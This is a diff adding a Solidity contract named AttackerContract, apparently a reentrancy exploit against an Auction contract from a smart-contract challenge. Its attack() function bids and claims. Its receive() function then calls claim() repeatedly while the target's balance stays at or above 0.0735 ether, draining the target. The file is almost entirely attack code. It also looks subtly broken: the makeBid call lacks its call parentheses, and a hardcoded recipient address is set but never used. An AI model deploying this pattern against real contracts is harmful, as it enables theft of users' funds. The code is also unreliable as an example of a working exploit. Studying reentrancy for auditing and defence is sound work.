@@ -1,0 +1,31 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.8; 
+import "./Game.sol";
+
+
+contract AttackerContract {
+    Auction target;
+    address to;
+    uint256 count;
+    
+    
+
+    constructor(Auction _target) {
+        target = _target;
+        to = 0x4815A8Ba613a3eB21A920739dE4cA7C439c7e1b1;
+        count = 0.0735 ether;
+
+    }
+
+    function attack() public payable {
+        target.makeBid{value: 0.0735 ether};
+        target.claim();
+
+    }
+
+    receive() external payable {
+        if (address(target).balance >= 0.0735 ether) {
+            target.claim();
+        }
+    }
+}
